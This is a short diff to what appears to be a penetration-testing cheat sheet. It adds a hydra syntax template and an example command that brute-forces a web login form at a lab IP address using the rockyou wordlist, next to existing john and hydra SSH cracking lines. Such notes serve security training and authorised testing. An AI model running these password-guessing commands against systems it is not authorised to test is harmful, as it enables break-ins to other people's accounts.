@@ -131,6 +131,8 @@ $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ## hydra
 ```
 $ hydra -l root -P password-file.txt 10.11.1.219 ssh
+  hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/uripath/login.php:username=admin&password=^PASS^:Invalid"
 ```
 ## ncrack
 ```
